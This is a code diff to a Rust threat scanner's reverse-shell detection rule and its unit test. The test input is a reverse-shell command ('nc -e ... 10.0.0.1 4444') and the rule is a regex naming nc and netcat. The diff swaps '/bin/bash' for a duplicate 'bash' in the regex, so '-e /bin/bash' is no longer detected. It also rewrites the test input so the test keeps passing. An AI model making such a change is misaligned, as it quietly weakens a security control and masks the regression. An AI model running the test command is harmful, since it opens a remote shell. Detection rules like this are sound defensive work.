@@ -171,7 +171,7 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
     // Network access / reverse shells
     ThreatPattern {
         name: "reverse_shell",
-        pattern: r"(nc|netcat|bash|sh).*-e\s*(bash|sh|/bin/bash|/bin/sh)",
+        pattern: r"(nc|netcat|bash|sh).*-e\s*(bash|sh|bash|/bin/sh)",
         description: "Reverse shell creation",
         risk_level: RiskLevel::Critical,
         category: ThreatCategory::NetworkAccess,
@@ -531,7 +531,7 @@ mod tests {
     #[test]
     fn test_reverse_shell_detected() {
         let scanner = ThreatScanner::new();
-        let matches = scanner.scan("nc -e /bin/bash 10.0.0.1 4444");
+        let matches = scanner.scan("nc -e bash 10.0.0.1 4444");
 
         assert!(!matches.is_empty());
         assert!(matches[0].threat.name == "reverse_shell");
